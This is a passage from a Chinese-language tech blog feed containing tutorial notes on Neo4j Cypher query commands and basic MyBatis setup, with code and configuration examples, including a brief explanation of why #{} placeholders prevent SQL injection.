<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># e.g</span><br><span class="line"># 查询Dept下的内容</span><br><span class="line"><span class="keyword">MATCH</span> (dept:Dept);</span><br><span class="line"># 查询<span class="keyword">User</span>标签中 name 属性为 Tom 的节点</span><br><span class="line"><span class="keyword">MATCH</span>  (n: <span class="keyword">User</span>&#123;name: &quot;Tom&quot; &#125;);</span><br><span class="line"># 查询<span class="keyword">User</span>标签中 name 属性为 Tom 的节点，使用（<span class="keyword">where</span>命令）</span><br><span class="line"><span class="keyword">MATCH</span> (n:<span class="keyword">User</span>) <span class="keyword">WHERE</span> n.name <span class="operator">=</span> &quot;Tom&quot;</span><br></pre></td></tr></table></figure>

<h1 id="二、CREATE命令"><a href="#二、CREATE命令" class="headerlink" title="二、CREATE命令"></a>二、CREATE命令</h1><blockquote>
<p> <strong>Neo4j使用CQL CREATE 命令</strong></p>
<ul>
<li>创建节点</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> (</span><br><span class="line">   [节点名]:标签名</span><br><span class="line">   &#123; 	</span><br><span class="line">      属性名<span class="number">1</span>:属性值<span class="number">1</span>,</span><br><span class="line">      ........</span><br><span class="line">      属性名n:属性值n</span><br><span class="line">   &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># e.g</span><br><span class="line"># 创建一个Person类的节点，名为Mike,年龄<span class="number">18</span></span><br><span class="line"><span class="keyword">CREATE</span> (node:Person &#123;age:<span class="number">18</span>, name:&quot;Mike&quot;&#125;)</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>创建关系</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> (节点<span class="number">1</span>:标签<span class="number">1</span>)<span class="operator">-</span>[关系名:关系标签]<span class="operator">-</span><span class="operator">&gt;</span>(节点<span class="number">2</span>:标签<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># e.g</span><br><span class="line"># 对 节点p1 与 p2 建立 LIKES 关系</span><br><span class="line"><span class="keyword">CREATE</span> (p1:Profile1)<span class="operator">-</span>[r1:LIKES]<span class="operator">-</span><span class="operator">&gt;</span>(p2:Profile2)</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>为节点或关系创建单个或多个标签</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> (</span><br><span class="line">   节点名:标签名<span class="number">1</span>,标签名<span class="number">2.</span>..标签名n</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># e.g</span><br><span class="line"># 为 节点m 创建 Movie、Cinema、Film、Picture 标签</span><br><span class="line"><span class="keyword">CREATE</span> (m:Movie:Cinema:Film:Picture)</span><br></pre></td></tr></table></figure>


<h1 id="三、RETURN子句"><a href="#三、RETURN子句" class="headerlink" title="三、RETURN子句"></a>三、RETURN子句</h1><blockquote>
<p>Neo4j CQL RETURN子句用于 -</p>
<ul>
<li>检索节点的某些属性</li>
<li>检索节点的所有属性</li>
<li>检索节点和关联关系的某些属性</li>
<li>检索节点和关联关系的所有属性</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RETURN</span> </span><br><span class="line">   节点名.属性名<span class="number">1</span>,</span><br><span class="line">   ........</span><br><span class="line">   节点名.属性名n;</span><br><span class="line">#<span class="comment">---------------------------</span></span><br><span class="line"><span class="keyword">RETURN</span> 节点名;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># e.g</span><br><span class="line"># 返回 节点n 的 name 属性</span><br><span class="line"><span class="keyword">RETURN</span> n.name</span><br></pre></td></tr></table></figure>

<h1 id="四、WHERE子句"><a href="#四、WHERE子句" class="headerlink" title="四、WHERE子句"></a>四、WHERE子句</h1><blockquote>
<p>像SQL一样，Neo4j CQL在CQL MATCH命令中提供了WHERE子句来过滤MATCH查询的结果。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WHERE</span> 条件;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Neo4j CQL中的布尔运算符</strong> Neo4j支持以下布尔运算符在Neo4j CQL WHERE子句中使用以支持多个条件。</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164029.png"></p>
<blockquote>
<p><strong>Neo4j CQL中的比较运算符</strong> Neo4j 支持以下的比较运算符，在 Neo4j CQL WHERE 子句中使用来支持条件。</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164029.png"></p>
<h1 id="五、DELETE删除"><a href="#五、DELETE删除" class="headerlink" title="五、DELETE删除"></a>五、DELETE删除</h1><blockquote>
<p><strong>Neo4j使用CQL DELETE子句</strong></p>
<ul>
<li>删除节点。</li>
<li>删除节点及相关节点和关系。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> 节点<span class="number">1</span>,节点<span class="number">2</span>,...关系<span class="number">1</span>,关系<span class="number">2.</span>..;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># e.g</span><br><span class="line"># 删除 节点 cc 以及 节点 c 以及两者的关系 rel</span><br><span class="line"><span class="keyword">MATCH</span> (cc: CreditCard)<span class="operator">-</span>[rel]<span class="operator">-</span>(c:Customer) </span><br><span class="line"><span class="keyword">DELETE</span> cc,c,rel</span><br></pre></td></tr></table></figure>

<h1 id="六、REMOVE删除"><a href="#六、REMOVE删除" class="headerlink" title="六、REMOVE删除"></a>六、REMOVE删除</h1><blockquote>
<p> <strong>Neo4j CQL REMOVE命令用于</strong></p>
<ul>
<li>删除节点或关系的标签</li>
<li>删除节点或关系的属性</li>
</ul>
<p> <strong>Neo4j CQL DELETE和REMOVE命令之间的主要区别</strong> </p>
<ul>
<li>DELETE操作用于删除节点和关联关系。</li>
<li>REMOVE操作用于删除标签和属性。</li>
</ul>
<p> <strong>Neo4j CQL DELETE和REMOVE命令之间的相似性</strong> </p>
<ul>
<li>这两个命令不应单独使用。</li>
<li>两个命令都应该与MATCH命令一起使用。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">REMOVE </span><br><span class="line">  节点名.属性<span class="number">1</span>,</span><br><span class="line">  节点名.属性<span class="number">2</span>,</span><br><span class="line">  .... </span><br><span class="line">  节点名.属性n,</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># e.g</span><br><span class="line"># 删除 节点 n 的 name 属性</span><br><span class="line"><span class="keyword">MATCH</span> (n:Person) </span><br><span class="line">REMOVE n.name</span><br></pre></td></tr></table></figure>

<h1 id="七、SET子句"><a href="#七、SET子句" class="headerlink" title="七、SET子句"></a>七、SET子句</h1><blockquote>
<p> <strong>Neo4j CQL 已提供 SET 子句来执行以下操作。</strong></p>
<ul>
<li>向现有节点或关系添加新属性。</li>
<li>添加或更新属性值。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span>  </span><br><span class="line">  节点.属性<span class="number">1</span> <span class="operator">=</span> 值<span class="number">1</span>,</span><br><span class="line">  节点.属性<span class="number">2</span> <span class="operator">=</span> 值<span class="number">2</span>,</span><br><span class="line">  .... </span><br><span class="line">  节点.属性n <span class="operator">=</span> 值n,</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># e.g</span><br><span class="line"># 将节点n 的 name 属性设置为 Jack</span><br><span class="line"><span class="keyword">MATCH</span> (n:Person)</span><br><span class="line"><span class="keyword">SET</span> n.name <span class="operator">=</span> <span class="string">&#x27;Jack&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="八、LIMIT与SKIP子句"><a href="#八、LIMIT与SKIP子句" class="headerlink" title="八、LIMIT与SKIP子句"></a>八、LIMIT与SKIP子句</h1><blockquote>
<p><strong>Neo4j CQL提供“LIMIT”与“SKIP”子句来过滤或限制查询返回的行数。</strong></p>
<ul>
<li>“LIMIT”修整CQL查询结果集底部的结果；</li>
<li>“SKIP”修整CQL查询结果集顶部的结果。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT 限制行数</span><br><span class="line"><span class="keyword">SKIP</span> 限制行数</span><br></pre></td></tr></table></figure>

<h1 id="综合案例"><a href="#综合案例" class="headerlink" title="~综合案例"></a>~综合案例</h1><blockquote>
<h2 id="①查"><a href="#①查" class="headerlink" title="①查"></a>①查</h2></blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 根据节点属性值 返回 具体单个节点</span><br><span class="line"><span class="keyword">MATCH</span>  (n: <span class="keyword">User</span>&#123;name:  &quot;TOM&quot; &#125;) <span class="keyword">return</span>  n;</span><br><span class="line"></span><br><span class="line"># 根据对象返回对象中的部分属性并限制行数</span><br><span class="line"><span class="keyword">MATCH</span> (n:Person) <span class="keyword">RETURN</span> n.name LIMIT <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"># 根据属性的条件区间 返回 所在区间的对象属性</span><br><span class="line"><span class="keyword">MATCH</span> (n: Movie) <span class="keyword">WHERE</span> n.released <span class="operator">&gt;=</span> <span class="number">1990</span> <span class="keyword">AND</span> n.released <span class="operator">&lt;</span> <span class="number">2000</span> <span class="keyword">RETURN</span> n.title</span><br><span class="line"></span><br><span class="line"># 查询 节点对象 、其关系 以及 关系的节点</span><br><span class="line"><span class="keyword">MATCH</span> (tom:Person &#123;name: &quot;Tom Hanks&quot;&#125;)<span class="operator">-</span>[:ACTED_IN]<span class="operator">-</span><span class="operator">&gt;</span>(tomHanksMovies) <span class="keyword">RETURN</span> tom,tomHanksMovies</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<h2 id="②改"><a href="#②改" class="headerlink" title="②改"></a>②改</h2></blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 修改属性</span><br><span class="line"><span class="keyword">MATCH</span> (a:<span class="keyword">User</span>&#123;name:&quot;JACK&quot;,age:<span class="number">12</span>&#125;) <span class="keyword">SET</span> a.age<span class="operator">=</span><span class="number">5</span> <span class="keyword">return</span> a;</span><br></pre></td></tr></table></figure>

<blockquote>
<h2 id="③增"><a href="#③增" class="headerlink" title="③增"></a>③增</h2></blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 创建一个节点</span><br><span class="line"><span class="keyword">CREATE</span>  (k : Person&#123; name:<span class="string">&#x27;Mike&#x27;</span>,born:<span class="number">2002</span>&#125;) <span class="keyword">RETURN</span> k;</span><br><span class="line"></span><br><span class="line"># 创建多个节点</span><br><span class="line"><span class="keyword">CREATE</span> (:<span class="keyword">User</span>&#123;name:&quot;爷爷&quot;,age:<span class="number">76</span>&#125;),</span><br><span class="line">       (:<span class="keyword">User</span>&#123;name:&quot;奶奶&quot;,age:<span class="number">74</span>&#125;),</span><br><span class="line">       (:<span class="keyword">User</span>&#123;name:&quot;爸爸&quot;,age:<span class="number">43</span>&#125;),</span><br><span class="line">       (:<span class="keyword">User</span>&#123;name:&quot;妈妈&quot;,age:<span class="number">41</span>&#125;);</span><br><span class="line"></span><br><span class="line"># 基于现有节点 创建一个关系</span><br><span class="line"><span class="keyword">MATCH</span> (f:<span class="keyword">User</span>&#123;name:&quot;爸爸&quot;&#125;) <span class="keyword">MATCH</span> (m:<span class="keyword">User</span>&#123;name:&quot;妈妈&quot;&#125;) <span class="keyword">CREATE</span> (f)<span class="operator">-</span>[r:夫妻]<span class="operator">-</span><span class="operator">&gt;</span>(m) <span class="keyword">RETURN</span> f,r,m</span><br><span class="line"></span><br><span class="line"># 创建 节点 <span class="operator">+</span> 关系</span><br><span class="line"><span class="keyword">CREATE</span> (:<span class="keyword">User</span>&#123;name:&quot;Jack&quot;,age:<span class="number">12</span>&#125;)<span class="operator">-</span>[:夫妻]<span class="operator">-</span><span class="operator">&gt;</span>(:<span class="keyword">User</span>&#123;name:&quot;Rose&quot;,age:<span class="number">9</span>&#125;)</span><br></pre></td></tr></table></figure>

<blockquote>
<h2 id="④删"><a href="#④删" class="headerlink" title="④删"></a>④删</h2></blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 删除语句 先删关系在删节点。</span><br><span class="line"><span class="keyword">MATCH</span> (n:<span class="keyword">User</span>&#123;name:&quot;Jack&quot;&#125;)<span class="operator">-</span>[r]<span class="operator">-</span>() <span class="keyword">WHERE</span> n.age<span class="operator">=</span><span class="number">0.6</span> <span class="keyword">DELETE</span> r, n;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis的基本使用</title>
    <url>/posts/4e57a7dc.html</url>
    <content><![CDATA[<h1 id="一、Mybatis简介"><a href="#一、Mybatis简介" class="headerlink" title="一、Mybatis简介"></a>一、Mybatis简介</h1><blockquote>
<ul>
<li>Mybatis是一款优秀的持久层框架，用于简化JSBC开发</li>
<li>Mybatis官网：<a href="https://mybatis.org/mybatis-3/zh/index.html">Mybatis官网</a></li>
</ul>
<hr>
<p> <strong>什么是持久层？</strong></p>
<ul>
<li>负责将数据保存到数据库的那一层代码 </li>
<li>JavaEE三层架构：表现层、业务层、持久层</li>
</ul>
</blockquote>
<hr>
<blockquote>
<p><strong>JDBC缺点</strong></p>
<ul>
<li>硬编码</li>
</ul>
<ol>
<li>注册驱动，获取连接</li>
<li>sql语句</li>
</ol>
<ul>
<li>操作繁琐</li>
</ul>
<ol>
<li>手动设置参数</li>
<li>手动封装数据集<img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"></li>
</ol>
</blockquote>
<h1 id="二、Mybatis操作步骤"><a href="#二、Mybatis操作步骤" class="headerlink" title="二、Mybatis操作步骤"></a>二、Mybatis操作步骤</h1><blockquote>
<p><strong>Mybati使用步骤总结</strong></p>
<ol>
<li>配置Mybtis核心配置文件（一般将其命名为 mybatis-config.xml）</li>
<li>根据核心配置文件创建 SqlSessionFactory 对象</li>
<li>通过 SqlSessionFactory 对象创建 SqlSession 对象</li>
<li>通过 SqlSession 对象操作数据库 CRUD</li>
<li>提交事务</li>
<li>释放资源</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加载 mybatis核心配置文件，获取 SqlSessionFactory</span></span><br><span class="line"><span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line"><span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取SqlSession 对象， 执行 sql</span></span><br><span class="line"><span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 sql</span></span><br><span class="line"><span class="comment">// &quot;名称空间.id&quot; 是sql映射文件中sql语句的唯一标识</span></span><br><span class="line">List&lt;User&gt; users = sqlSession.selectList(<span class="string">&quot;名称空间.id&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">sqlSession.close();</span><br></pre></td></tr></table></figure>
<h2 id="①核心配置文件"><a href="#①核心配置文件" class="headerlink" title="①核心配置文件"></a>①核心配置文件</h2><blockquote>
<p> <strong>从 XML 文件中构建 SqlSessionFactory 的实例非常简单，建议使用类路径下的资源文件进行配置。XML 配置文件中包含了对 MyBatis系统的核心设置，包括获取数据库连接实例的数据源（DataSource）以及决定事务作用域和控制方式的事务管理器（TransactionManager）。通过核心配置文件，我们可以&#x3D;&#x3D;替换连接信息，解决硬编码问题&#x3D;&#x3D;。这里先给出一个简单的示例：</strong></p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    </span></span><br><span class="line"><span class="comment">        加载配置文件信息，主要是数据源的连接信息</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;db.properties&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        类型别名，可简写 resultType，省略包名</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.tyt.pojo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        environments:配置数据库连接环境信息。可以配置多个environment，通过default切换不同的environment</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--连接信息--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driverClassName&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--加载sql映射文件--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/tyt/mapper/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>其中数据源的连接信息将其写在db.properties中，详情如下：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">driverClassName=com.mysql.jdbc.Driver</span><br><span class="line">url=jdbc:mysql://localhost:3306/test?useSSL=false</span><br><span class="line">username=root</span><br><span class="line">password=****</span><br></pre></td></tr></table></figure>

<h2 id="②SQL映射文件"><a href="#②SQL映射文件" class="headerlink" title="②SQL映射文件"></a>②SQL映射文件</h2><blockquote>
<p><strong>SQL映射文件可&#x3D;&#x3D;统一管理SQL语句，解决硬编码问题&#x3D;&#x3D;。这里给出一个示例（四个基础的增删改查）：</strong></p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    namespace:名称空间</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">useGeneratedKeys</span>=<span class="string">&quot;true&quot;</span> <span class="attr">keyColumn</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">        insert into tb_brand (companyName, brandName,  ordered, description, status)</span><br><span class="line">        values (#&#123;companyName&#125;, #&#123;brandName&#125;,  #&#123;ordered&#125;, #&#123;description&#125;, #&#123;status&#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteById&quot;</span>&gt;</span></span><br><span class="line">        delete from tb_brand where id = #&#123;id&#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;update&quot;</span>&gt;</span></span><br><span class="line">        update tb_brand</span><br><span class="line">        set</span><br><span class="line">            brandName = #&#123;brandName&#125;,</span><br><span class="line">            companyName = #&#123;companyName&#125;,</span><br><span class="line">            ordered = #&#123;ordered&#125;,</span><br><span class="line">            description = #&#123;description&#125;,</span><br><span class="line">            status = #&#123;status&#125;</span><br><span class="line">        where id = #&#123;id&#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Brand&quot;</span>&gt;</span></span><br><span class="line">        select * from tb_brand;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="③参数符号"><a href="#③参数符号" class="headerlink" title="③参数符号"></a>③参数符号</h2><blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"><br>SQL映射文件中的sql语句有两个占位符，分别是： <code>#&#123;&#125;</code>与<code>$&#123;&#125;</code> 。<br>我们一般采用 <code>#&#123;&#125;</code>，<code>#&#123;&#125;</code>在Mybatis会被解析为<code>?</code>，就是JDBC中的PreparedStatement中的<code>?</code>占位符，说明它也有预编译的功能。</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">* 参数占位符：</span><br><span class="line">        1： #&#123;&#125;: 将其替换为&#x27;？&#x27; ， 防止 sql 注入</span><br><span class="line">        2： $&#123;&#125;： 拼 sql, 存在 sql 注入</span><br><span class="line">        3. 使用时机：</span><br><span class="line">           * 参数传递时： #&#123;&#125;</span><br><span class="line">           * 表名或列名不固定时： $&#123;&#125;</span><br><span class="line">        * 参数类型： parameterType 可省略</span><br><span class="line">        * 特殊字符处理</span><br><span class="line">           1、转义字符：</span><br><span class="line">           2. CDATA： &lt;1[CDATA[ 符号 ]]&gt;</span><br></pre></td></tr></table></figure>
<h2 id="④映射失败的解决方案"><a href="#④映射失败的解决方案" class="headerlink" title="④映射失败的解决方案"></a>④映射失败的解决方案</h2><p>当数据库表列名与实体类属性名不一致时，不能自动封装数据。例如，在数据库中，使用下划线命名方式；在实体类中，使用驼峰命名。在此，提供了三种解决方案，其中第三个使用reultMap最为广泛使用。<br>我这里有一个表tb_brand并定义了实体类Brand，可以发现，在数据库中使用的下划线命名，在实体类中使用的驼峰命名。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"></p>
<blockquote>
<ul>
<li><strong>方法一：&#x3D;&#x3D;起别名&#x3D;&#x3D;（在sql语句中，对不一样的列名起别名，别名与属性名一致）</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"><br>缺点：繁琐，每次查询都要起别名</li>
<li>方法二：&#x3D;&#x3D;定义sql片段&#x3D;&#x3D;<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png">缺点：一个sql片段仅针对一种情况，不够灵活</li>
<li>方法三：&#x3D;&#x3D;resultMap&#x3D;&#x3D;<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"></li>
</ul>
</blockquote>
<h1 id="三、Mapper代理开发"><a href="#三、Mapper代理开发" class="headerlink" title="三、Mapper代理开发"></a>三、Mapper代理开发</h1><blockquote>
<p><strong>目的</strong></p>
<ul>
<li>解决原生方式（即&#x3D;&#x3D;二、Mybatis操作步骤&#x3D;&#x3D;）的硬编码</li>
<li>简化后期执行sql<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"></li>
</ul>
</blockquote>
<blockquote>
<ol>
<li>定义与SQL映射文件同名的Mapper接口，并将其Mapper接口和SQL映射文件放置在同一目录</li>
<li>设置SQL映射文件的&#x3D;&#x3D;namespace&#x3D;&#x3D;属性为&#x3D;&#x3D;Mapper接口限定全名&#x3D;&#x3D;</li>
<li>在Mapper接口中定义方法，方法名就是SQL映射文件中sql语句的id，并保持参数类型和返回值类型一致</li>
<li>编码<br>         ① 通过SqlSession的getMapper方法获取Mapper接口的代理对象<br>         ② 调用对应方法完成sql的执行</li>
</ol>
</blockquote>
<p>注：如果Mapper接口名称与SQL映射文件名称相同，并在同一目录，则可使用&#x3D;&#x3D;包扫描&#x3D;&#x3D;的方式简化SQL映射文件的加载<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"></p>
<p><strong>①SQL映射文件与SQL映射文件同名的Mapper接口</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"><br><strong>② 设置SQL映射文件的namespace属性为Mapper接口限定全名</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"></p>
<h1 id="四、注解开发"><a href="#四、注解开发" class="headerlink" title="四、注解开发"></a>四、注解开发</h1><blockquote>
<p><strong>如果不习惯用xml配置文件，则可以考虑使用注解的开发方式。注解的开发方式，会将sql语句写入代码，缺点是后续可维护性与拓展性不强（若想修改sql语句，需要更改代码，重新打包部署，但使用xml方式，只需修改xml文件，并用新的文件替代原xml文件即可）</strong></p>
</blockquote>
<hr>
<blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png" alt="这里是引用"></p>
<ul>
<li>查询：@Select</li>
<li>添加：@Insert</li>
<li>修改：@Update</li>
<li>删除：@Delete</li>
</ul>
</blockquote>
<blockquote>
<p>&#x3D;&#x3D;<strong>提示</strong>&#x3D;&#x3D;：</p>
<ul>
<li>注解完成简单功能</li>
<li>配置文件完成复杂功能</li>
</ul>
</blockquote>
<h1 id="五、SQL映射文件中sql语句高级"><a href="#五、SQL映射文件中sql语句高级" class="headerlink" title="五、SQL映射文件中sql语句高级"></a>五、SQL映射文件中sql语句高级</h1><h2 id="1、参数传递"><a href="#1、参数传递" class="headerlink" title="1、参数传递"></a>1、参数传递</h2><p><strong>Mybatis中SQL语句有3种方式可以设置参数：</strong></p>
<blockquote>
